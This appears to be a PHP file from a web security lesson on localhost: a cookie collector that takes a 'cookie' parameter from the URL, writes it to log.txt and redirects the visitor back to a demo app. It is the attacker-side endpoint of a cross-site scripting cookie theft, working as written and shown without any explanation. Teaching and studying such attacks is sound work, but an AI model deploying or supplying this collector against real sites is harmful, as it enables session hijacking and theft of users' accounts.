<?php

$cookie = $_GET['cookie'];

file_put_contents('log.txt', $cookie);

header('Location: http://localhost/files/XAMPP/XAMPP/PHP_lessons/Codecourse/Security/app/index.php');